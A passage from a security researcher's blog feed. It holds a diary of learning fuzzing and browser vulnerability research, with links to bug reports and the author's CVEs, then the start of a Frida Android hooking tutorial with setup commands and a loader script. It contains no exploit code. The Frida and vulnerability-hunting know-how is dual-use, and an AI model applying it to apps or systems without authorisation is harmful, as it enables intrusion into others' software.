rel="noopener">https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf</a></li><li>工控协议Fuzz的一个比较有趣的资料？<br><a href="https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg</a></li><li>想学fuzz，等35C3 talk的PPT。</li></ol><h2 id="2018-12-27-31"><a href="#2018-12-27-31" class="headerlink" title="2018-12-27-31"></a>2018-12-27-31</h2><ol><li><p>35c3 video和日程整理<br><a href="https://media.ccc.de" target="_blank" rel="noopener">https://media.ccc.de</a><br><a href="https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html" target="_blank" rel="noopener">https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html</a></p></li><li><p>开始fuzz之旅<br>From Zero to Zero Day-Jonathan Jacobi<br><a href="https://www.youtube.com/watch?v=xp1YDOtWohw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=xp1YDOtWohw</a><br>Attacking Chrome IPC-nedwill<br><a href="https://www.youtube.com/watch?v=39yPeiY808w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=39yPeiY808w</a><br>The Layman’s Guide to Zero-Day Engineering<br><a href="https://www.youtube.com/watch?v=WbuGMs2OcbE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=WbuGMs2OcbE</a></p></li><li><p>简述一下From Zero to Zero Day里我觉得有趣的东西</p><ul><li>基础很重要，其中最重要的就是c/c++/os(或者你具体研究的那个系统，比如浏览器)internal/能用python或者其他语言coding来实现自己的想法。<br>最后一点我觉得<a href="https://ktkitty.github.io/" target="_blank" rel="noopener">KT</a>师傅搞的非常棒，可惜我太菜了。</li><li>通过CTF或者具体的简单的小软件来学习关于漏洞的基础知识，不要害怕失败，从其他人的解法中你依然能学到非常多的东西，这里建议follow defcon预选赛和defcon的赛题，其他的可以不做，没有什么意义。<br>推荐一个系列教程<br><a href="http://liveoverflow.com/capture_the_flag/index.html" target="_blank" rel="noopener">http://liveoverflow.com/capture_the_flag/index.html</a><br><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br>但是要注意，不要在“浅水区”待太久，你只要确保自己有继续进行研究的能力即可，我觉得半年可以完成这些事情，然后继续往下。</li><li>接下来需要的就是eat sleep pwn,repeat;2333<br>这里的建议是，当你掌握了一些trick和思路之后，你可以尝试去理解真实的漏洞，理解其中的pattern<br>比如你可以去看google project zero提交的漏洞，并研究他们。</li><li>后面的部分是一个有趣的漏洞和它的exp，不过这部分其实有点无聊。</li></ul></li></ol><p>我似乎懂了些什么有趣的东西，从jsc开始实践。why not v8?it’s difficult…）</p><ol start="4"><li>继续简述一下Attacking Chrome IPC里的一些我觉得关键的地方<ul><li>练习代码审计<ol><li>拿到一个已经存在的漏洞报告</li><li>知道漏洞大概发生在什么地方，或者是什么模块，不要去看完整的漏洞描述，尝试去发现漏洞。</li><li>如果你失败了，看一下漏洞报告，并且去总结你错过了什么地方。</li><li>重复这个过程，直到你觉得OK为止。</li></ol></li><li>练习fuzz<ol><li>请确定自己有充分的审计上的练习</li><li>拿到一个漏洞，通过自己写fuzz去trigger它。</li></ol></li><li>protobuf-mutator+libfuzzer</li></ul></li></ol><p>年终的最后几天，是一边睡觉一边和这些有趣的talk度过的，还看了35c3的v8题目，有一个逃逸分析的点想了半个月没想到，是我蠢了。<br>有趣的挑战，明年要继续努力了，夯实基础，砥砺前行。<br>一个人久了真的很累呀，新的一年，找个朋友一起住，一起打打游戏，搞搞研究，开开心~熬过这半年就好了。</p><h2 id="2019-1-1-2"><a href="#2019-1-1-2" class="headerlink" title="2019-1-1-2"></a>2019-1-1-2</h2><ol><li>写一个能跑的js fuzz，然后慢慢调。<br>lighthouse+lcov–&gt;feedback<br>dharma–&gt;语法生成<br>将两部分结合一下就是一个能跑的js fuzz，写代码真麻烦2333<br>今天大概看了看dharma的语法描述文件怎么写，想想要写一堆语法描述就麻烦。。</li><li>youtube上看到一个小系列The Art of Fuzzing，upx是真的很好fuzz。。很快一堆crash<br>然后是google的libfuzzerTutorial很有趣。<br><a href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md" target="_blank" rel="noopener">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md</a></li><li>所以今天大概最后就是再看了一下webkid。</li></ol><h2 id="2019-1-3-9"><a href="#2019-1-3-9" class="headerlink" title="2019-1-3-9"></a>2019-1-3-9</h2><ol><li>研究safari jsc<br>safari JIT exploit<br><a href="https://www.youtube.com/watch?v=bqehb-YZ9jo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bqehb-YZ9jo</a><br><a href="https://share.weiyun.com/5IJZPBp" target="_blank" rel="noopener">https://share.weiyun.com/5IJZPBp</a><br>fuzz book<br><a href="https://www.fuzzingbook.org" target="_blank" rel="noopener">https://www.fuzzingbook.org</a><br>pizlo jsc<br><a href="http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf</a><br><a href="http://www.filpizlo.com/" target="_blank" rel="noopener">http://www.filpizlo.com/</a><br>其他乱七八糟的paper<br><a href="https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf" target="_blank" rel="noopener">https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf</a><br>Array Bounds Check Elimination for the Java HotSpotTM Client Compiler<br><a href="http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf" target="_blank" rel="noopener">http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf</a></li></ol><h2 id="2019-1-12"><a href="#2019-1-12" class="headerlink" title="2019-1-12"></a>2019-1-12</h2><ol><li>研究编译原理<br><a href="https://www.bilibili.com/video/av17669734/?p=77" target="_blank" rel="noopener">https://www.bilibili.com/video/av17669734/?p=77</a><br>刷完视频刷书，重新看感觉有新收获，得到的认知就是：</li></ol><ul><li>要知道你看的这个东西是用来做什么的，解决什么问题的</li><li>它具体可能是怎么实现的，js引擎里是怎么实现的</li><li>modern compiler和书里的不同之处</li></ul><h2 id="2019-4-2"><a href="#2019-4-2" class="headerlink" title="2019-4-2"></a>2019-4-2</h2><p>不写日记感觉不能梳理自己每天在干嘛，就写一下好了。</p><ol><li><p>学习saelo的两个spiderMonkey漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1791" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1791</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1810" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1810</a></p></li><li><p>学习saelo的jsc漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1753" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1753</a><br>关于ArrayWithSlowPutStorage</p></li></ol><h2 id="2019-4-24"><a href="#2019-4-24" class="headerlink" title="2019-4-24"></a>2019-4-24</h2><ol><li>在漫长的时间里无所作为，开始反省自己遇到的瓶颈到底是什么，除了chakra，其他浏览器的JIT优化漏洞总是越来越少了。<br>首先是在我花了很长时间的浏览器JIT优化方面，已经很久没有chrome v8的有趣漏洞出现了，我分析了龚广天府cup的漏洞，以及最近的那个FileReader的漏洞，有趣的是，它们的漏洞pattern都是，在处理超长的数据或者其他东西的时候，没有处理好，导致畸形数据或者错误的程序执行逻辑产生，但是并不太好迅速的针对进行审计。<br>我依然更感兴趣在优化漏洞上，尤其是大宝发现的那些chakra漏洞，非常有趣，但是v8里没有chakra那些奇奇怪怪的设计。</li><li>fuzz依然是我更感兴趣的方向，但是单纯js fuzz已经没什么前途了。。<br>和Atum这样的顶级二进制选手聊过之后，感觉自己在更多的软件实现，尤其是内核的一些东西上的欠缺，要更理解这些系统机制以及如何操纵它们才可以。<br><a href="https://github.com/A7um/syscallhook" target="_blank" rel="noopener">https://github.com/A7um/syscallhook</a><br>强的令人发指。。<br>通过顶级CTF来迭代知识依然是一个好的选择，抛弃掉无用的heap相关的赛题，剩下的题目质量依然很高很好，值得学习，尤其是c3 ctf。</li><li>挖了这么久漏洞，终于明白了，攻击面和结合攻击面去fuzz，是最合适的挖洞方法，剩下就是code smell。</li><li>我觉得逻辑漏洞是一个很有趣的方向，不知道有没有大佬带我玩，逆向一些国产小软件的进程间通信来找找漏洞啥的。</li></ol><h2 id="2019-4-25"><a href="#2019-4-25" class="headerlink" title="2019-4-25"></a>2019-4-25</h2><p>最近分析的比较有趣的浏览器漏洞。<br>Issue 1793: Chrome: Integer overflow in NewFixedDoubleArray<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1793" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1793</a><br>CVE-2019-5786 FileReader UaF<br>OOB Write in ValueDeserializer::ReadDenseJSArray (Tian Fu Cup）<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=905940" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=905940</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906313" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906313</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=914731" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=914731</a><br>现在看这些漏洞，有一些有趣的code smell了。浏览器对我来说慢慢的也已经变成了一个看得懂的东西呢，不过离挖到洞还早。</p><h2 id="2019-6-5"><a href="#2019-6-5" class="headerlink" title="2019-6-5"></a>2019-6-5</h2><p>我的CVE。</p><ol><li><a href="https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html</a><br>[$TBD][950328] Medium CVE-2019-5831: Incorrect map processing in V8. Reported by yngwei(JiaWei, Yin) of IIE Varas and <strong>sakura of Tecent Xuanwu Lab</strong> on 2019-04-07</li><li><a href="https://support.apple.com/en-us/HT210123" target="_blank" rel="noopener">https://support.apple.com/en-us/HT210123</a><br>CVE-2019-8583: <strong>sakura of Tencent Xuanwu Lab</strong>, and dwfault working at ADLab of Venustech<br>从开始搞浏览器到现在，差不多就是一年，去掉一些零零碎碎的做其他事情的时间，可能大概半年多一些，我也有自己的google和apple致谢了。<br>刚刚好在我毕业答辩期间收到编号，可能是我的毕业礼物了，thanks~哈哈<br>既然发了日记就说一下我的理解，在实习的这一年里认识了非常多的大佬，我在xuanwu lab的导师sky还有lw和明月师傅他们，r3kapig的Ne0和Atum他们，还有和我一起讨论学习的yngwei和dwfault,jessica他们，都给了我非常多的帮助和启发。<br>在推特上面也认识了不少的朋友，以及follow了很多大佬，尤其是project zero的saelo，跟进最新的漏洞并分析，研究漏洞挖掘的新技术新手法，不断提升自己。<br>所以学习这件事情，最重要的就是开阔视野，你以为的有用的东西并不真的有用，实际的漏洞挖掘考察的是对目标的理解和深度，并不是说和简单的CTF pwn一样，只是hack game，ctf非常有意义，但是也要认识到这一点，真正决定你能不能挖到漏洞的，永远是对目标软件的理解，并没有什么特别特别通用的知识。<br>Just spend a long time learning and doing it, you will get better.</li></ol><h2 id="2019-6-6"><a href="#2019-6-6" class="headerlink" title="2019-6-6"></a>2019-6-6</h2><p>最近这几天一直在想漫长的一个月做点什么，嗯，没错，我毕业了，毕业答辩结束，应该没什么幺蛾子的话，会顺利的会玄武上班。<br>然后就有点迷茫，暂时，嗯，暂时不太想继续肝JS engine了，花了太久，产出有限，希望做些有趣的事情，嗯，当然fuzz还会继续跑。<br>想学的东西有点多，我是出于兴趣在搞技术的，有些复杂的东西其实不太想牵扯到其中，我喜欢挖到漏洞，喜欢和厉害的人交流技术弥补不足。<br>还想学更多有趣的东西。</p><h2 id="2019-6-23"><a href="#2019-6-23" class="headerlink" title="2019-6-23"></a>2019-6-23</h2><ol><li>拿到了毕业证和学位证，准备入职了，列一下计划。</li><li>和@aSiagaming一起解决gctf chrome sandbox escape pwn.<br><a href="https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic</a><br>题目出处应该是这个issue。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1755</a><br>现在需要补充大量的基础知识。</li><li>复习v8 JIT相关的知识和漏洞，准备一个share.</li><li>开始打hacker101的ctf，练习一些web的基础知识。</li><li>每天坚持锻炼和饮食。</li></ol><h2 id="2019-6-28"><a href="#2019-6-28" class="headerlink" title="2019-6-28"></a>2019-6-28</h2><ol><li>上班第一周，全在搬砖，一点漏洞研究的事情没做，粗略的翻了下ned的议题还有chrome mojo。</li><li>思想还需要转变，毕竟上班就是这样，leader让你干什么你就得干什么，哪怕你是造火箭的，也得来拧螺丝钉。</li><li>虽然很想挖洞，也觉得工作和自己想象中不一样，不够帅，但是，还是要积极调整啊。</li><li>我的第二个v8 cve可能要发下来了，开心。</li></ol><h2 id="2019-7-3"><a href="#2019-7-3" class="headerlink" title="2019-7-3"></a>2019-7-3</h2><ol><li>爬虫写的越来越快了。。我可以写篇博客讲爬虫了。。</li><li>学习natalie的挖洞思路，先把webrtc搭起来了。<br><a href="https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch" target="_blank" rel="noopener">https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch</a><br>natalie的编译脚本有点问题，改成下面这样就OK了,学习了一下谷歌的构建链。<br><a href="https://blog.csdn.net/Vincent95/article/details/70849035" target="_blank" rel="noopener">https://blog.csdn.net/Vincent95/article/details/70849035</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rtc_static_library(&quot;call&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;call.cc&quot;,</span><br><span class="line">    &quot;call_factory.cc&quot;,</span><br><span class="line">    &quot;call_factory.h&quot;,</span><br><span class="line">    &quot;degraded_call.cc&quot;,</span><br><span class="line">    &quot;degraded_call.h&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.cc&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.h&quot;,</span><br><span class="line">    &quot;receive_time_calculator.cc&quot;,</span><br><span class="line">    &quot;receive_time_calculator.h&quot;,</span><br><span class="line">    &quot;..&#x2F;test&#x2F;rtp_file_writer.cc&quot;,</span><br><span class="line">    &quot;..&#x2F;test&#x2F;rtp_file_writer.h&quot;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    &quot;..&#x2F;rtc_base:rtc_json&quot;,</span><br></pre></td></tr></table></figure></li><li>调试分析漏洞。</li></ol><h2 id="2019-7-8"><a href="#2019-7-8" class="headerlink" title="2019-7-8"></a>2019-7-8</h2><ol><li>这周想给自己的漏洞写一下利用,CVE-2019-5831,issue-950328，这个洞是我回学校忙毕业的时候出的，一直没空仔细看，怎么说呢，从回学校毕业之后到现在，也有好几个月了，一直没有调试分析chrome漏洞了，其实对引擎的理解就还不够深刻，漏洞基本上是fuzz出的，这段时间也一直在考虑和去改fuzz，不过和大佬聊过之后觉得，挖漏洞这件事情，必须经常反思为什么别人能挖到，自己没挖到，是这个点没看到么，如果不是，那是什么原因。<br>嗯，是我看的还不够仔细，那就从自己的漏洞开始搞吧。</li></ol><h2 id="2019-7-28"><a href="#2019-7-28" class="headerlink" title="2019-7-28"></a>2019-7-28</h2><ol><li>这段时间基本上还是在改改FUZZ，然后挖到了我的第二个chrome v8 cve，其实是个很有趣的漏洞，等有空我会分享它，但总的来说，现在v8的JIT漏洞已经很难发现了，我现在主要发现的漏洞也不太和JIT有关，但是我很喜欢这类优化漏洞，所以我依然在梳理这方面的知识。</li><li>因为一些原因，重新看了看自己以前分析过的漏洞，在重新写文档，发现以前写的东西真的是和shi一样难看。在某个瞬间之后，我好像对这些漏洞的理解提升了，嗯，没有任何原因，就是单纯的随便翻了翻资料，重新看了看代码，看了看IR。</li><li>最近在腾讯的入职封闭培训，玩的还是很开心的，认识了更多有趣的人，嗯，都是大佬2333。其实最近是很迷茫的，对未来的迷茫，我好像走进了工作以后的第一个分叉点，但是开弓没有回头箭，我目前的目标就是认认真真的做安全研究，攻破每一个我没攻破过的目标。</li><li>说了这么多废话，其实这次的日记更新想写一些心得，这是我和某个大佬凌晨在湖边闲聊学到的。<br>在某个很长期的阶段，你会投身于某个领域，并对其进行深耕，但是如何保证你现在研究的，学到的知识，在五年后，甚至很短的一年后还有用，这其实是很难保证的，尤其是安全研究这个快速攻防迭代的领域，你积累下来的东西，很可能在下一年里就不再存在了，这当然有很多种不同的理解，其中之一是积累下来的东西还不够深，不够通用。<br>我认为逆向和开发的能力是十分重要的，比如当想到一个idea之后，能快速实现的coding能力，以及做任何非开源软件的攻防都必须具备的逆向能力。<br>嗯，说的比较笼统，但大家其实是可以思考一下，你学到的知识应该如何“保值”，如何提升自己的个人竞争力。</li></ol><h2 id="2019-8-8"><a href="#2019-8-8" class="headerlink" title="2019-8-8"></a>2019-8-8</h2><p>最近还是挺烦的，各种烦心的事情，不过还是记录一下这段时间做了什么。<br>这段时间把loki挖的chakra的历史漏洞看了一下，主要理解一下chakracore的codebase，方便后面分析样本，然后准备写一个导入语料的功能，这样就可以通过根据筛选语料来导入更多的，嗯，基因突变，哈哈。<br>还是有很多事情想做，但是受限于能力没做成，不过，加油吧。test</p><h2 id="2019-8-12"><a href="#2019-8-12" class="headerlink" title="2019-8-12"></a>2019-8-12</h2><ol><li>写了一下fuzzilli导入语料</li><li>todo list:<br>学习chrome sandbox escape<br><a href="https://labs.bluefrostsecurity.de/blog/2019/08/08/escaping-the-chrome-sandbox-via-an-indexeddb-race-condition/" target="_blank" rel="noopener">https://labs.bluefrostsecurity.de/blog/2019/08/08/escaping-the-chrome-sandbox-via-an-indexeddb-race-condition/</a></li></ol><h2 id="2019-9-12"><a href="#2019-9-12" class="headerlink" title="2019-9-12"></a>2019-9-12</h2><ol><li>最近我大概有新的chrome高危漏洞产出，期待下个月的致谢：），fuzz也有很多新思路在改了，target也不再局限在浏览器了</li><li>嘛，发生了好多事情…各方面都是，即将顺利的从玄武离职，其中个中曲折就不说了，社会人心险恶（茶</li><li>最近有挺多对安全研究和二进制漏洞挖掘怀有期望的年轻人问我问题，不过，我觉得他们需要好好审视几个问题。</li></ol><p>第一，是否有足够扎实的开发或者逆向基础，包括但不限于以下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.C++ STL实现一套tiny STL且熟悉STL源码</span><br><span class="line">2.Kernel自己实现一个，且熟悉Linux 2.6源码</span><br><span class="line">3.使用LLVM backend pass实现过compiler，可参考UToronto Compiler Optimization且熟悉libfuzzer源码</span><br></pre></td></tr></table></figure><p>第二，是否有追踪前沿的安全议题和漏洞，并有一些自己的思路和想法。<br>如果想清楚这些，并且能够做到上述的基础扎实，欢迎一起讨论问题呀2333</p><h2 id="2019-10-24"><a href="#2019-10-24" class="headerlink" title="2019-10-24"></a>2019-10-24</h2><ol><li>现在在360 alpha team端茶倒水学审计。</li><li>彻底分成工作日记和生活日记了。。都快忘记更新了，good luck.</li></ol><h2 id="2020-1-11"><a href="#2020-1-11" class="headerlink" title="2020-1-11"></a>2020-1-11</h2><p>新年快乐~民那桑</p><h2 id="2020-06-01"><a href="#2020-06-01" class="headerlink" title="2020-06-01"></a>2020-06-01</h2><p>长期想认识有一点二进制基础，也有一定的开发基础，以后想做二进制漏洞挖掘的大二及以下的小朋友（大三保研也可？），没有也没关系，最重要的是人品好，正直。喜欢看动漫最佳，如果有想和我交流和学习的小朋友，欢迎发个自我介绍（包括学校、专业、掌握的技能、性格爱好等？）到我的邮箱。<br>（笑</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018-1-28&quot;&gt;&lt;a href=&quot;#2018-1-28&quot; class=&quot;headerlink&quot; title=&quot;2018-1-28&quot;&gt;&lt;/a&gt;2018-1-28&lt;/h2&gt;&lt;p&gt;1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）&lt;br&gt;2
      
    
    </summary>
    
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>Frida Android hook</title>
    <link href="http://eternalsakura13.com/2020/07/04/frida/"/>
    <id>http://eternalsakura13.com/2020/07/04/frida/</id>
    <published>2020-07-03T17:10:01.471Z</published>
    <updated>2020-07-08T07:37:41.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>本篇文章学到的内容来自且完全来自r0ysue的知识星球，推荐一下。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-07-061015.png" alt=""></p><h2 id="Frida环境"><a href="#Frida环境" class="headerlink" title="Frida环境"></a>Frida环境</h2><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>python全版本随机切换，这里提供<a href="https://github.com/pyenv/pyenv#homebrew-on-macos" target="_blank" rel="noopener">macOS上的配置方法</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">brew install pyenv</span><br><span class="line">echo -e &#39;if command -v pyenv 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n  eval &quot;$(pyenv init -)&quot;\nfi&#39; &gt;&gt; ~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">下载一个3.8.2，下载真的很慢，要慢慢等</span><br><span class="line">pyenv install 3.8.2</span><br><span class="line"></span><br><span class="line">pyenv versions</span><br><span class="line">sakura@sakuradeMacBook-Pro:~$ pyenv versions</span><br><span class="line">  system</span><br><span class="line">* 3.8.2 (set by &#x2F;Users&#x2F;sakura&#x2F;.python-version)</span><br><span class="line">切换到我们装的</span><br><span class="line">pyenv local 3.8.2</span><br><span class="line">python -V</span><br><span class="line">pip -V</span><br><span class="line">原本系统自带的</span><br><span class="line">python local system</span><br><span class="line">python -V</span><br></pre></td></tr></table></figure><p>另外当你需要临时禁用pyenv的时候<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-17-134140.png" alt=""><br>把这个注释了然后另开终端就好了。</p><p>关于卸载某个python版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Uninstalling Python Versions</span><br><span class="line">As time goes on, you will accumulate Python versions in your $(pyenv root)&#x2F;versions directory.</span><br><span class="line"></span><br><span class="line">To remove old Python versions, pyenv uninstall command to automate the removal process.</span><br><span class="line"></span><br><span class="line">Alternatively, simply rm -rf the directory of the version you want to remove. You can find the directory of a particular Python version with the pyenv prefix command, e.g. pyenv prefix 2.6.8.</span><br></pre></td></tr></table></figure><h3 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a>frida安装</h3><p>如果直接按下述安装则会直接安装frida和frida-tools的最新版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br><span class="line">frida-ps --version</span><br></pre></td></tr></table></figure><p>我们也可以自由安装旧版本的frida，例如12.8.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.7.7</span><br><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip install frida-tools&#x3D;&#x3D;5.3.0</span><br></pre></td></tr></table></figure><p>老版本frida和对应关系<br>对应关系很好找<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-17-134837.png" alt=""></p><h3 id="安装objection"><a href="#安装objection" class="headerlink" title="安装objection"></a>安装objection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.8.2</span><br><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install objection&#x3D;&#x3D;1.8.4</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><h3 id="frida使用"><a href="#frida使用" class="headerlink" title="frida使用"></a>frida使用</h3><p>下载frida-server并解压，在这里下载<a href="https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz" target="_blank" rel="noopener">frida-server-12.8.0</a></p><p>先adb shell，然后切换到root权限,把之前push进来的frida server改个名字叫fs<br>然后运行frida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push &#x2F;Users&#x2F;sakura&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida-server-12.8.0-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod +x fs</span><br><span class="line">.&#x2F;fs</span><br></pre></td></tr></table></figure><p>如果要监听端口，就</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><h3 id="frida开发环境搭建"><a href="#frida开发环境搭建" class="headerlink" title="frida开发环境搭建"></a>frida开发环境搭建</h3><ol><li>安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;oleavr&#x2F;frida-agent-example.git</span><br><span class="line">cd frida-agent-example&#x2F;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></li><li>使用vscode打开此工程，在agent文件夹下编写js，会有智能提示。</li><li><code>npm run watch</code>会监控代码修改自动编译生成js文件</li><li>python脚本或者cli加载_agent.js<br><code>frida -U -f com.example.android --no-pause -l _agent.js</code></li></ol><p>下面是测试脚本</p><p><code>s1.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><code>loader.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device8 = frida.get_device_manager().add_remote_device(<span class="string">"192.168.0.9:8888"</span>)</span><br><span class="line">pid = device8.spawn(<span class="string">"com.android.settings"</span>)</span><br><span class="line">device8.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device8.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"si.js"</span>) <span class="keyword">as</span> f:</span><br><span 